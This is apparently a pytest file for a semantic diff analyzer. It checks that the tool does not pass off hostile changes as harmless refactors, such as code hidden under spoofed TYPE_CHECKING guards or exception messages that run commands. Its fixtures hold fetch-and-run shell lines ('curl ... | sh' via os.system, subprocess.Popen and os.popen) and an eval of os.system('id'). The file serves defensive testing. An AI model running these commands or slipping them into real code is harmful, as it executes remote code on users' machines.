"""A hostile change cannot pass for one that changes no behavior.

The comparison sets aside what only a type checker reads, imports in step with the code using them,
and reworded exception messages. Each of these regressions is code that does run, or a literal that
is code, written to look like one of them.
"""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path

import pytest

from semantic_diff_weaver.ast_diff.compare import compare_symbol
from semantic_diff_weaver.ast_diff.extract import extract_symbols
from semantic_diff_weaver.ast_diff.types import StructuralDelta
from semantic_diff_weaver.service import analyze
from semantic_diff_weaver.source import SourceHunk

Factory = Callable[..., tuple[Path, str, str]]

WIDE_HUNK = SourceHunk(id="hunk-001", old_start=1, old_count=400, new_start=1, new_count=400)
PAYLOAD = "    os.system('curl https://example.invalid/x | sh')\n"


def _compare(old: str, new: str, name: str = "<module>") -> list[StructuralDelta]:
    old_symbol, new_symbol = (
        {item.qualified_name: item for item in extract_symbols(source)}[name]
        for source in (old, new)
    )
    return compare_symbol("pkg/mod.py", old_symbol, new_symbol, (WIDE_HUNK,))


@pytest.mark.parametrize(
    ("prelude", "test"),
    [
        pytest.param("TYPE_CHECKING = True\n", "TYPE_CHECKING", id="assigned-true"),
        pytest.param("from evil import TYPE_CHECKING\n", "TYPE_CHECKING", id="imported-elsewhere"),
        pytest.param(
            "from typing import TYPE_CHECKING\nfrom .evil import *\n",
            "TYPE_CHECKING",
            id="star-imported-over",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nimport typing\ntyping.TYPE_CHECKING = True\n",
            "TYPE_CHECKING",
            id="patched-attribute",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nglobals()['TYPE_CHECKING'] = True\n",
            "TYPE_CHECKING",
            id="rebound-by-name",
        ),
        pytest.param(
            "import typing\nsetattr(typing, 'TYPE_CHECKING', True)\n",
            "typing.TYPE_CHECKING",
            id="patched-by-name",
        ),
        pytest.param("import evil as t\n", "t.TYPE_CHECKING", id="another-module"),
        pytest.param("import typing as t\nt = evil\n", "t.TYPE_CHECKING", id="module-rebound"),
        pytest.param(
            "from typing import TYPE_CHECKING\ndef TYPE_CHECKING():\n    pass\n",
            "TYPE_CHECKING",
            id="defined",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nfor TYPE_CHECKING in [True]:\n    pass\n",
            "TYPE_CHECKING",
            id="loop-variable",
        ),
        pytest.param("", "TYPE_CHECKING", id="unbound"),
        pytest.param(
            "from typing import TYPE_CHECKING\ntry:\n    pass\nexcept Exception as TYPE_CHECKING:\n"
            "    pass\n",
            "TYPE_CHECKING",
            id="caught",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nmatch os.environ:\n    case {**TYPE_CHECKING}:\n"
            "        pass\n",
            "TYPE_CHECKING",
            id="captured",
        ),
        pytest.param("from typing import TYPE_CHECKING\n", "TYPE_CHECKING or DEBUG", id="or-else"),
    ],
)
def test_code_under_a_type_checking_test_that_may_run_is_compared(prelude: str, test: str) -> None:
    old = f"import os\n{prelude}if {test}:\n    LIMIT = 3\n"
    new = f"import os\n{prelude}if {test}:\n    LIMIT = 3\n{PAYLOAD}"
    kinds = {item.kind for item in _compare(old, new)}
    assert "call_change" in kinds
    assert "structural_refactor" not in kinds


def test_deeply_nested_type_checking_blocks_stay_within_the_budget() -> None:
    """Each block is set aside by recursion, bounded by the AST depth budget like any nesting."""
    depth = 90
    lines = ["from typing import TYPE_CHECKING"]
    for level in range(depth):
        indent = "    " * level
        lines.append(f"{indent}if TYPE_CHECKING:\n{indent}    pass\n{indent}else:")
    lines.append("    " * depth + "LIMIT = 3")
    old = "\n".join(lines) + "\n"
    assert {item.kind for item in _compare(old, old.replace("3", "4"))} == {"assignment_change"}


@pytest.mark.parametrize(
    ("old", "new"),
    [
        pytest.param(
            "os.system('echo one two')", "os.system('curl evil | sh')", id="a-command-raised"
        ),
        pytest.param(
            "ValueError(eval('1 + 1'))",
            "ValueError(eval(\"__import__('os').system('id')\"))",
            id="code-evaluated-for-a-message",
        ),
        pytest.param(
            "subprocess.Popen('ls -la', shell=True)",
            "subprocess.Popen('curl evil | sh', shell=True)",
            id="a-process-raised",
        ),
        pytest.param(
            "ValueError(os.popen('ls -la').read())",
            "ValueError(os.popen('curl evil | sh').read())",
            id="a-command-s-output-for-a-message",
        ),
    ],
)
def test_a_literal_that_runs_is_never_a_reworded_message(old: str, new: str) -> None:
    template = "def fail():\n    raise {}\n"
    kinds = {item.kind for item in _compare(template.format(old), template.format(new), "fail")}
    assert "raise_change" in kinds
    assert "structural_refactor" not in kinds


def test_a_reworded_message_is_shown_redacted() -> None:
    old = "def login(user):\n    raise PermissionError('password=hunter2 is wrong')\n"
    (delta,) = _compare(old, old.replace("is wrong", "was refused"), "login")
    assert delta.metadata.get("reworded") is True
    assert "hunter2" not in f"{delta.old} {delta.new}"


def test_an_import_loaded_for_what_it_does_is_reported(repo_factory: Factory) -> None:
    """A new import nothing reads may run anything when the module loads."""
    code = "def total(items):\n    return sum(items)\n"
    repo, base, head = repo_factory(
        {"shop/cart.py": code}, {"shop/cart.py": f"import shop.payload  # noqa: F401\n\n{code}"}
    )
    result = analyze(
        {"repo_path": str(repo), "base_ref": base, "head_ref": head, "output_format": "json"}
    )
    found = {
        (item["category"], evidence["symbol"])
        for item in result["behavior_changes"]
        for evidence in item["evidence"]
    }
    assert ("unknown_semantic_change", "<module>") in found
